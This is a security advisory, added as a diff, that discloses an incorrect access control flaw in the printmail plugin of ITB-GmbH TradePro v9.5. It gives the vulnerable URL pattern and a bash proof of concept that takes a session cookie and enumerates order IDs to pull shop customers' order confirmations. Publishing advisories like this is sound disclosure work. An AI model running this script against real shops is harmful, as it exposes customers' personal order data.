@@ -1,0 +1,54 @@
+== Affected Software
+[%hardbreaks]
+**Vendor:** ITB-GmbH
+**Affected Products:** TradePro (v9.5)
+**Component:** Printmail Plugin
+**Confirmed:** yes
+
+== Attack Vector
+[%hardbreaks]
+**Type:** Incorrect Access Control
+**Access-Type:** Remote
+**Impact:** Information Disclosure
+
+Incorrect Access Control in the `printmail` plugin in ITB-GmbH
+TradePro v9.5 allows remote attackers to receive all order confirmations from the online shop by passing arbitrary order numbers to an http(s) endpoint.
+
+== Description
+The `orderid` should be known beforehand but can be enumerated easily or by using an SQLi (see Report link:/security/CVE-2023-36645[CVE-2023-36645])
+
+Calling `http(s)://[DOMAIN]/shop/de/?plugin=printmail&wkid=[COOKIE]&orderid=[ORDER_ID]` with a valid but unauthenticated session cookie gives the attacker access to all order confirmations.
+
+== CVSS
+[%hardbreaks]
+**Score:** 7.1
+**Vector:** https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N/E:P[CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N/E:P]
+
+== PoC
+[source, bash]
+----
+#! /bin/bash
+DOMAIN=$1
+TEST_PATH="shop/de/sys/"
+#TEST_PATH="shop/de/"
+SAMPLE1_ID=0
+
+
+COOKIE=$(curl -s -c - $DOMAIN | grep sessiontradepro | cut -f7)
+echo "Got Cookie: $COOKIE"
+SAMPLE1=$(curl -s -w '\nsize_download %{size_download}' "$DOMAIN/$TEST_PATH?plugin=printmail&wkid=$COOKIE&orderid=$SAMPLE1_ID" | grep size_download | cut -d" " -f2)
+echo Test URL: "$DOMAIN/$TEST_PATH?plugin=printmail&wkid=$COOKIE&orderid=%ID%"
+echo "========"
+echo $SAMPLE1_ID $SAMPLE1
+for SAMPLE2_ID in {24000..25000}
+ do
+   SAMPLE2=$(curl -s -w '\nsize_download %{size_download}' "$DOMAIN/$TEST_PATH?plugin=printmail&wkid=$COOKIE&orderid=$SAMPLE2_ID" | grep size_download | cut -d" " -f2)
+   echo $SAMPLE2_ID $SAMPLE2
+done
+----
+
+== Credits
+- Lynn
+- Jadyn
+- https://zerforschung.org[zerforschung.org]
+
